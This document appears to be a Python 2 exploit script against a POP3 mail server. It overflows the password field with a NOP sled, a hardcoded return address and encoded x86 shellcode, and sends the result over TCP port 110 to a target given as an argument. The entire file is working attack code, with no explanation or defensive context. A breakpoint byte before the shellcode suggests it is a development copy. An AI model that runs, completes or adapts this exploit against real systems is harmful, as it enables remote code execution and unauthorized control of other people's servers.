import socket
import sys
import struct

TCP_IP = sys.argv[1]
TCP_PORT = 110

#bad chars \x00\x0a\x0d

shellcode = ""
shellcode += "\xdb\xc2\xd9\x74\x24\xf4\xba\xe2\xc8\xbb\x18\x5f"
shellcode += "\x33\xc9\xb1\x56\x31\x57\x18\x83\xef\xfc\x03\x57"
shellcode += "\xf6\x2a\x4e\xe4\x1e\x28\xb1\x15\xde\x4d\x3b\xf0"
shellcode += "\xef\x4d\x5f\x70\x5f\x7e\x2b\xd4\x53\xf5\x79\xcd"
shellcode += "\xe0\x7b\x56\xe2\x41\x31\x80\xcd\x52\x6a\xf0\x4c"
shellcode += "\xd0\x71\x25\xaf\xe9\xb9\x38\xae\x2e\xa7\xb1\xe2"
shellcode += "\xe7\xa3\x64\x13\x8c\xfe\xb4\x98\xde\xef\xbc\x7d"
shellcode += "\x96\x0e\xec\xd3\xad\x48\x2e\xd5\x62\xe1\x67\xcd"
shellcode += "\x67\xcc\x3e\x66\x53\xba\xc0\xae\xaa\x43\x6e\x8f"
shellcode += "\x03\xb6\x6e\xd7\xa3\x29\x05\x21\xd0\xd4\x1e\xf6"
shellcode += "\xab\x02\xaa\xed\x0b\xc0\x0c\xca\xaa\x05\xca\x99"
shellcode += "\xa0\xe2\x98\xc6\xa4\xf5\x4d\x7d\xd0\x7e\x70\x52"
shellcode += "\x51\xc4\x57\x76\x3a\x9e\xf6\x2f\xe6\x71\x06\x2f"
shellcode += "\x49\x2d\xa2\x3b\x67\x3a\xdf\x61\xef\x8f\xd2\x99"
shellcode += "\xef\x87\x65\xe9\xdd\x08\xde\x65\x6d\xc0\xf8\x72"
shellcode += "\xe4\xc6\xfa\xad\x4e\x86\x04\x4e\xae\x8e\xc2\x1a"
shellcode += "\xfe\xb8\xe3\x22\x95\x38\x0b\xf7\x03\x33\x9b\x38"
shellcode += "\x7b\x42\xda\xd1\x79\x45\xca\x89\xf4\xa3\xa2\x99"
shellcode += "\x56\x7c\x03\x4a\x16\x2c\xeb\x80\x99\x13\x0b\xab"
shellcode += "\x70\x3c\xa6\x44\x2c\x14\x5f\xfc\x75\xee\xfe\x01"
shellcode += "\xa0\x8a\xc1\x8a\x40\x6a\x8f\x7a\x21\x78\xf8\x1c"
shellcode += "\xc9\x80\xf9\x88\xc9\xea\xfd\x1a\x9e\x82\xff\x7b"
shellcode += "\xe8\x0c\xff\xa9\x6b\x4a\xff\x2f\x5d\x20\x36\xba"
shellcode += "\xe1\x5e\x37\x2a\xe1\x9e\x61\x20\xe1\xf6\xd5\x10"
shellcode += "\xb2\xe3\x19\x8d\xa7\xbf\x8f\x2e\x91\x6c\x07\x47"
shellcode += "\x1f\x4a\x6f\xc8\xe0\xb9\xf3\x0f\x1e\x3f\xdc\xb7"
shellcode += "\x76\xbf\x5c\x48\x86\xd5\x5c\x18\xee\x22\x72\x97"
shellcode += "\xde\xcb\x59\xf0\x76\x41\x0c\xb2\xe7\x56\x05\x12"
shellcode += "\xb9\x57\xaa\x8f\x4a\x2d\xc3\x30\xab\xd2\xcd\x54"
shellcode += "\xac\xd2\xf1\x6a\x91\x04\xc8\x18\xd4\x94\x6f\x12"
shellcode += "\x63\xb8\xc6\xb9\x8b\xee\x19\xe8"

payload = "\x90"*(4654)
# payload += shellcode
payload += struct.pack("<I",0x6FCD49AC)
payload += "\x90"*10+"\xcc"
payload += shellcode
# payload += "\xcc\xd9\xee\xd9\x74\x24\xf4\x59\xfe\xcd\xfe\xcd\x8b\xe1\xff\xe1"
payload += "\x90"*(5300-len(payload))

req = "USER admin\r\n"
req += "PASS "+payload+"\n\r"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send("USER admin\r\n")
s.send("PASS "+payload+"\n\r")
s.close()
